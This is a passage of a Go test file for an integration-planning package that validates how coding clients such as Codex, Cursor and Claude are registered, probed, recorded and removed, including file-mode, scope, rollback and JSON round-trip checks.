	custom.Checks = append(custom.Checks, VerificationCheck{Name: "conformance host", Method: VerificationConformanceHost, Passed: true})
	if err := custom.Validate(); err != nil {
		t.Fatalf("conformance-backed custom adapter rejected: %v", err)
	}
	badKind := openclaw
	badKind.ConnectionKind = "magic"
	if err := badKind.Validate(); err == nil {
		t.Fatal("unknown connection kinds are rejected even for non-verified states")
	}
}

// P3-5: the private local state record can be removed, only inside the local
// state root and only with a snapshot rollback.
func TestRemoveLocalStateStep(t *testing.T) {
	statePath := testStateRoot + "/workspaces/" + testWorkspaceID + "/codex.json"
	removal := codexPlan(t)
	removal.Operation = PlanOperationRemove
	removal.Registration = nil
	removal.ApprovalSteps = nil
	removal.ResultingState = ""
	removal.Steps = []PlanStep{{StepID: "state", Kind: StepRemoveLocalState, Description: "forget the integration", Path: statePath, Reversibility: Reversible, Rollback: snapshotRollback(statePath)}}
	mustAccept(t, "remove_local_state in a removal plan", removal)
	removal.Steps[0].Mode = 0o600
	mustReject(t, "removal carries no mode", removal, "no mode")
	removal.Steps[0].Mode = 0
	removal.Steps[0].Rollback = &RollbackAction{Kind: RollbackDeleteCreated, Path: statePath}
	mustReject(t, "removal undone only by snapshot", removal, "restore_snapshot")
	removal.Steps[0].Rollback = snapshotRollback(testRoot + "/.tracker/integrations/state.json")
	removal.Steps[0].Path = testRoot + "/.tracker/integrations/state.json"
	mustReject(t, "local state outside the state root", removal, "local state root")
	removal.Steps[0].Path = statePath
	removal.Steps[0].Rollback = snapshotRollback(statePath)
	removal.LocalStateRoot = ""
	mustReject(t, "no state root", removal, "local_state_root")
}

// P3-6: managed-file modes and step scopes are constrained.
func TestManagedFileModeAndScopeRules(t *testing.T) {
	plan := codexPlan(t)
	plan.Steps[1].Mode = 0o777
	mustReject(t, "world-writable skill file", plan, "0644 or 0600")
	plan.Steps[1].Mode = 0o600
	mustAccept(t, "private managed file", plan)
	plan.Steps[1].Mode = 0
	mustReject(t, "managed file without a mode", plan, "0644 or 0600")
	plan = codexPlan(t)
	plan.Steps[2].Scope = "bogus"
	mustReject(t, "unknown step scope", plan, "does not match plan scope")
	plan.Steps[2].Scope = ScopeUser
	mustReject(t, "user-scope step in a project_shared plan", plan, "does not match plan scope")
	plan.Steps[2].Scope = ""
	mustReject(t, "config step without scope", plan, "must carry the plan scope")
	plan = codexPlan(t)
	plan.Steps[1].Scope = ScopeProjectShared
	mustAccept(t, "managed file tagged with the plan scope", plan)
	plan.Steps[0].Mode = 0
	mustReject(t, "managed block without a mode", plan, "0644 or 0600")
	plan = codexPlan(t)
	plan.Steps[3].Mode = 0o644
	mustReject(t, "command step with a mode", plan, "neither a path nor a mode")
	plan = codexPlan(t)
	plan.Steps[3].Reversibility = Reversible
	mustReject(t, "read-only command with reversibility", plan, "read-only command")
}

// P3-7: a recorded state obeys the same placement rules as a plan.
func TestIntegrationStateRefusesAbsoluteBindingInRepositoryCarriedScope(t *testing.T) {
	absolute, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingAbsolutePath, WorkspaceRoot: testRoot}, "", false)
	now := time.Now()
	state := IntegrationState{Target: integrations.TargetCodex, ContractVersion: ContractVersion, State: StateConfiguredUnverified, Scope: ScopeProjectShared, WorkspaceID: testWorkspaceID, WorkspaceRoot: testRoot, Registration: &absolute, EntryFingerprint: absolute.Fingerprint(), UpdatedAt: now}
	if err := state.Validate(); err == nil {
		t.Fatal("a project_shared record cannot hold an absolute-path binding")
	}
	state.Target = integrations.TargetClaude
	state.Scope = ScopeProjectLocal
	if err := state.Validate(); err != nil {
		t.Fatalf("machine-local record with an absolute binding rejected: %v", err)
	}
	state.ClientExecutable = "claude"
	if err := state.Validate(); err == nil {
		t.Fatal("client executable must be absolute")
	}
	state.ClientExecutable = "/usr/local/bin/claude"
	state.NativeEntryFingerprint = "abc"
	if err := state.Validate(); err != nil {
		t.Fatalf("record with client executable and native fingerprint rejected: %v", err)
	}
}

// P3-8: cited sources are the live official pages.
func TestSourceURLsAreTheLiveDocumentationPages(t *testing.T) {
	codex, _ := CapabilitiesFor(integrations.TargetCodex)
	cursor, _ := CapabilitiesFor(integrations.TargetCursor)
	if !contains(codex.Sources, "https://learn.chatgpt.com/docs/config-file/config-reference") || contains(codex.Sources, "https://learn.chatgpt.com/docs/config-reference") {
		t.Fatalf("codex sources: %v", codex.Sources)
	}
	if !contains(cursor.Sources, "https://cursor.com/docs/mcp") || contains(cursor.Sources, "https://cursor.com/docs/context/mcp") {
		t.Fatalf("cursor sources: %v", cursor.Sources)
	}
}

func contains(list []string, want string) bool {
	for _, item := range list {
		if item == want {
			return true
		}
	}
	return false
}

// P3-9: a self-probe of a cwd-bound registration pins its working directory
// and substitutes client placeholders itself.
func TestServeCommandRequiresDirForCwdBoundRegistrations(t *testing.T) {
	cwd, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingVerifiedCwd}, "", false)
	if _, err := cwd.ServeCommand("", "", time.Minute); err == nil {
		t.Fatal("verified_cwd probe without a directory would inherit the caller's cwd")
	}
	cmd, err := cwd.ServeCommand("", testRoot, time.Minute)
	if err != nil || cmd.Dir != testRoot || cmd.Executable != testTracker {
		t.Fatalf("serve command = %+v, %v", cmd, err)
	}
	absolute, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingAbsolutePath, WorkspaceRoot: testRoot}, "", false)
	if _, err := absolute.ServeCommand("", "", time.Minute); err != nil {
		t.Fatalf("absolute-path registrations carry their workspace in argv: %v", err)
	}
	variable, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingClientVariable, Placeholder: "${workspaceFolder}"}, "", false)
	if _, err := variable.ServeCommand("", "", time.Minute); err == nil {
		t.Fatal("client_variable probe needs the directory Atlas substitutes for the placeholder")
	}
	cmd, err = variable.ServeCommand("", testRoot, time.Minute)
	if err != nil {
		t.Fatal(err)
	}
	for i, arg := range cmd.Args {
		if arg == "${workspaceFolder}" {
			t.Fatalf("placeholder left unexpanded at arg %d: %v", i, cmd.Args)
		}
		if arg == flagWorkspace && cmd.Args[i+1] != testRoot {
			t.Fatalf("--workspace must be the probe directory: %v", cmd.Args)
		}
	}
	if !reflect.DeepEqual(variable.Args, RegistrationArgs(testWorkspaceID, variable.Binding)) {
		t.Fatal("ServeCommand must not mutate the registration's own argv")
	}
	tampered := cwd
	tampered.Args = append(tampered.Args, "--read-only")
	if _, err := tampered.ServeCommand("", testRoot, time.Minute); err == nil {
		t.Fatal("a tampered registration cannot be probed")
	}
}

// Plans, states, and verifications survive a JSON round trip unchanged, so the
// journal and manifest can persist exactly what was validated.
func TestContractTypesRoundTripThroughJSON(t *testing.T) {
	plan := codexPlan(t)
	plan.ConsentedRoots = []string{"/etc/atlas-consented"}
	before, err := plan.Fingerprint()
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(plan)
	var backPlan IntegrationPlan
	if err := json.Unmarshal(raw, &backPlan); err != nil {
		t.Fatal(err)
	}
	if err := backPlan.Validate(); err != nil {
		t.Fatalf("round-tripped plan invalid: %v", err)
	}
	if after, _ := backPlan.Fingerprint(); after != before {
		t.Fatal("fingerprint changed across the round trip")
	}
	if !strings.Contains(string(raw), `"home":"`+testHome+`"`) {
		t.Fatalf("home must be persisted with the plan: %s", raw)
	}

	reg, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingVerifiedCwd}, "agent:codex-1", false)
	now := time.Date(2026, 9, 10, 13, 0, 0, 0, time.UTC)
	state := IntegrationState{Target: integrations.TargetCodex, ContractVersion: ContractVersion, State: StateConnected, Scope: ScopeProjectShared, WorkspaceID: testWorkspaceID, WorkspaceRoot: testRoot, ConfigPath: testRoot + "/.codex/config.toml", ClientExecutable: "/usr/local/bin/codex", Registration: &reg, EntryFingerprint: reg.Fingerprint(), NativeEntryFingerprint: "deadbeef", SkillVersion: "1.14.0", ClientVersion: ClientVersion{Known: true, Major: 0, Minor: 120}, LastVerifiedAt: now, UpdatedAt: now}
	raw, _ = json.Marshal(state)
	var backState IntegrationState
	if err := json.Unmarshal(raw, &backState); err != nil {
		t.Fatal(err)
	}
	if err := backState.Validate(); err != nil || !reflect.DeepEqual(backState, state) {
		t.Fatalf("state round trip: %v %+v", err, backState)
	}

	verification := Verification{Target: integrations.TargetCodex, State: StateConnected, ConnectionKind: ConnectionKindSelfProbe, ClientExecutable: "/usr/local/bin/codex", ServerExecutable: testTracker, CheckedAt: now,
		Checks: []VerificationCheck{{Name: "self_probe.tools_list", Method: VerificationSelfProbe, Passed: true, Detail: "41 tools"}},
		Probes: []ProbeRecord{{Command: Command{Purpose: CommandPurposeProbe, Executable: testTracker, Args: reg.Args, Dir: testRoot, Timeout: time.Minute}, ExitCode: 0, Summary: "initialize ok"}}}
	raw, _ = json.Marshal(verification)
	var backVerification Verification
	if err := json.Unmarshal(raw, &backVerification); err != nil {
		t.Fatal(err)
	}
	if err := backVerification.Validate(); err != nil || !reflect.DeepEqual(backVerification, verification) {
		t.Fatalf("verification round trip: %v %+v", err, backVerification)
	}
	identity := FileIdentity{Path: testRoot + "/.codex/config.toml", Exists: true, Mode: 0o644, Size: 120, Owner: &FileOwner{UID: 1000, GID: 1000}, SHA256: "00"}
	raw, _ = json.Marshal(identity)
	if !strings.Contains(string(raw), `"owner":{"uid":1000,"gid":1000}`) {
		t.Fatalf("file identity must record ownership: %s", raw)
	}
}

// A removal plan may only run the detected client's own remove or reload
// commands, never a register and never another executable.
func TestRemovalPlanCommandsAreTiedToTheDetectedClient(t *testing.T) {
	removal := openclawPlan(t)
	removal.Operation = PlanOperationRemove
	removal.Registration = nil
	removal.ResultingState = ""
	unset := *removal.Steps[1].Rollback.Command
	removal.Steps = []PlanStep{
		{StepID: "skill", Kind: StepRemoveManagedFile, Description: "remove skill", Path: testRoot + "/.agents/skills/atlas-worker/SKILL.md", Reversibility: Reversible, Rollback: snapshotRollback(testRoot + "/.agents/skills/atlas-worker/SKILL.md")},
		{StepID: "unset", Kind: StepRunClientCommand, Description: "openclaw mcp unset", Command: &unset, Reversibility: Irreversible, IrreversibleReason: "the client has no add-back that preserves the original definition"},
	}
	mustAccept(t, "openclaw removal", removal)
	foreign := unset
	foreign.Executable = "/usr/bin/curl"
	removal.Steps[1].Command = &foreign
	mustReject(t, "removal through another executable", removal, "detected client executable")
	reload := unset
	reload.Purpose = CommandPurposeReload
	reload.Args = []string{"mcp", "reload"}
	removal.Steps[1].Command = &reload
	mustAccept(t, "reload after removal", removal)
	register := unset
	register.Purpose = CommandPurposeRegister
	removal.Steps[1].Command = &register
	mustReject(t, "register during removal", removal, "register")
}
